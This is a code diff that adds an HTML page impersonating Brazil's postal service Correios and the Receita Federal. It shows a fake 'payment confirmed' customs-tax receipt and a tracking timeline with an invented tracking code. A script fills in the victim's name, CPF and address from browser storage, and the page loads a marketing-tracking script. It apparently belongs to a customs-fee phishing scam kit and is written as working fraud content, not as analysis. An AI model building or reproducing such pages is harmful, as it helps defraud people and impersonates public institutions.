@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Correios | Pagamento Confirmado</title>
+    <link rel="stylesheet" href="Correios%20_%20Rastreio_arquivos/bootstrap.css">
+    <link rel="stylesheet" href="Correios%20_%20Rastreio_arquivos/app.css">
+    <link rel="stylesheet" href="Correios%20_%20Rastreio_arquivos/yellow.css">
+    <link rel="stylesheet" href="Correios%20_%20Rastreio_arquivos/all.css" crossorigin="anonymous">
+    <link rel="stylesheet" type="text/css" href="css/all.css">
+    <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png">
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+</head>
+
+<body>
+    <header class="w-100 font-size-16 font-weight-400 text-blue">
+        <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
+            <a href="#" class="text-blue text-decoration-none">
+                Acessibilidade <span class="ml-1" style="font-size: 10px;">&#9660;</span>
+            </a>
+        </div>
+        <div class="">
+            <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning"
+                style="height:48px">
+                <div class="d-flex justify-content-center position-absolute w-100"
+                    style="left: 0; pointer-events: none;">
+                    <a href="#" class="py-2" style="pointer-events: auto;">
+                        <img src="Correios%20_%20Rastreio_arquivos/correios.png" alt="" height="25">
+                    </a>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="text-center mt-5 px-3">
+            <div class="d-inline-flex align-items-center justify-content-center bg-success text-white rounded-circle mb-4" 
+                 style="width: 80px; height: 80px; box-shadow: 0 4px 10px rgba(40, 167, 69, 0.3);">
+                <i class="fas fa-check fa-3x"></i>
+            </div>
+            
+            <h2 class="text-success font-weight-bold">PAGAMENTO CONFIRMADO!</h2>
+            <h5 class="text-blue-dark mt-2 font-weight-bold">Sua encomenda foi liberada com sucesso.</h5>
+            <p class="text-secondary max-w-600 mx-auto font-size-14">
+                O pagamento da tributação alfandegária foi processado e aprovado. O objeto foi encaminhado para a logística de entrega interna e seguirá para o endereço abaixo.
+            </p>
+        </div>
+
+        <section class="mt-4 px-2 w-95 max-w-1000" style="margin: 0 auto;">
+            <div class="border border-success rounded p-4 bg-white shadow-sm">
+                <div class="d-flex align-items-center mb-3 border-bottom border-success pb-3">
+                    <img src="Correios%20_%20Rastreio_arquivos/receita-federal.png" alt="Receita Federal" style="height: 35px;" class="mr-3">
+                    <span class="font-weight-bold text-success font-size-16">COMPROVANTE DE TRIBUTAÇÃO PAGO</span>
+                </div>
+
+                <div class="row font-size-15">
+                    <div class="col-md-6 mb-2">
+                        <strong>Destinatário:</strong> <span id="userName">Carregando...</span>
+                    </div>
+                    <div class="col-md-6 mb-2">
+                        <strong>CPF:</strong> <span id="userCPF">Carregando...</span>
+                    </div>
+                    <div class="col-md-12 mb-2">
+                        <strong>Endereço de Entrega:</strong> <span id="userAddress">Carregando...</span>
+                    </div>
+                    <div class="col-md-6 mb-2">
+                        <strong>Código de Rastreamento:</strong> <span class="font-weight-bold text-primary">NL391807214BR</span>
+                    </div>
+                    <div class="col-md-6 mb-2">
+                        <strong>Status do Objeto:</strong> <span class="badge badge-success font-size-13 py-1 px-2">Aguardando Transporte</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Atualização do Rastreio -->
+        <section class="mt-5 px-2 w-95 max-w-1000" style="margin:0 auto;">
+            <h5 class="text-blue-dark font-weight-bold mb-4">HISTÓRICO DO RASTREAMENTO:</h5>
+            <div class="p-3">
+                <ul class="list-unstyled position-relative"
+                    style="border-left: 2px solid #28a745; margin-left: 20px; padding-left: 30px;">
+
+                    <!-- Em trânsito (Novo Status) -->
+                    <li class="mb-5 position-relative">
+                        <div class="position-absolute bg-success rounded-circle d-flex align-items-center justify-content-center text-white"
+                            style="width: 50px; height: 50px; left: -56px; top: -5px; box-shadow: 0 2px 5px rgba(40,167,69,0.2);">
+                            <i class="fas fa-shipping-fast" style="font-size: 20px;"></i>
+                        </div>
+                        <h6 class="font-weight-bold text-success mb-1">Aguardando saída da Unidade de Fiscalização</h6>
+                        <p class="text-secondary font-size-14 mb-0">Unidade de Fiscalização Aduaneira - Curitiba, PR</p>
+                        <p class="text-secondary font-size-14 mb-0 font-weight-bold">Objeto liberado pela Receita Federal após confirmação de pagamento.</p>
+                    </li>
+
+                    <!-- Pagamento Confirmado -->
+                    <li class="mb-5 position-relative">
+                        <div class="position-absolute bg-success rounded-circle d-flex align-items-center justify-content-center text-white"
+                            style="width: 50px; height: 50px; left: -56px; top: -5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
+                            <i class="fas fa-receipt" style="font-size: 20px;"></i>
+                        </div>
+                        <h6 class="font-weight-bold text-blue-dark mb-1">Pagamento Confirmado</h6>
+                        <p class="text-secondary font-size-14 mb-0">Sistema de Pagamento Eletrônico dos Correios</p>
+                        <p class="text-secondary font-size-14 mb-0">Tributos aduaneiros e tarifas postais quitados com sucesso.</p>
+                    </li>
+
+                    <!-- Aguardando Pagamento -->
+                    <li class="mb-5 position-relative opacity-5">
+                        <div class="position-absolute bg-white border border-secondary rounded-circle d-flex align-items-center justify-content-center"
+                            style="width: 50px; height: 50px; left: -56px; top: -5px;">
+                            <img src="Correios%20_%20Rastreio_arquivos/icon-dollar.png" alt="" style="width: 30px; filter: grayscale(1);">
+                        </div>
+                        <h6 class="font-weight-bold text-secondary mb-1">Objeto aguardando pagamento</h6>
+                        <p class="text-secondary font-size-14 mb-0">em Unidade de Fiscalização Aduaneira, Curitiba, PR</p>
+                    </li>
+
+                    <!-- Recebido no Brasil -->
+                    <li class="mb-5 position-relative opacity-5">
+                        <div class="position-absolute bg-white border border-secondary rounded-circle d-flex align-items-center justify-content-center"
+                            style="width: 50px; height: 50px; left: -56px; top: -5px;">
+                            <img src="Correios%20_%20Rastreio_arquivos/icon-dolly.png" alt="" style="width: 30px; filter: grayscale(1);">
+                        </div>
+                        <h6 class="font-weight-bold text-secondary mb-1">Objeto recebido em território nacional</h6>
+                        <p class="text-secondary font-size-14 mb-0">Curitiba - PR</p>
+                    </li>
+                </ul>
+            </div>
+        </section>
+    </main>
+
+    <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark mt-5">
+        <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+            <h5 class="font-weight-700 mb-4">Fale Conosco</h5>
+            <ul>
+                <li class="mb-2 font-size-14">
+                    <i class="fas fa-desktop"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Registro de Manifestações</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-question-square mr-1"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Central de Atendimento</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+        <div class="d-flex justify-content-center w-100 px-3 mb-3 text-dark font-size-14">
+            <span>© Copyright 2026 Correios</span>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Load user data from localStorage
+            const name = localStorage.getItem('userName') || 'Destinatário';
+            const cpf = localStorage.getItem('userCPF') || 'Não informado';
+            const street = localStorage.getItem('addressStreet') || '';
+            const city = localStorage.getItem('addressCity') || '';
+            const state = localStorage.getItem('addressState') || '';
+            const cep = localStorage.getItem('userCEP') || '';
+
+            // Populate page content
+            document.getElementById('userName').textContent = name;
+            document.getElementById('userCPF').textContent = cpf;
+            
+            let fullAddress = 'Endereço não informado';
+            if (street || city || state) {
+                fullAddress = `${street}, ${city} - ${state}`;
+                if (cep) fullAddress += ` (CEP: ${cep})`;
+            }
+            document.getElementById('userAddress').textContent = fullAddress;
+        });
+    </script>
+</body>
+</html>
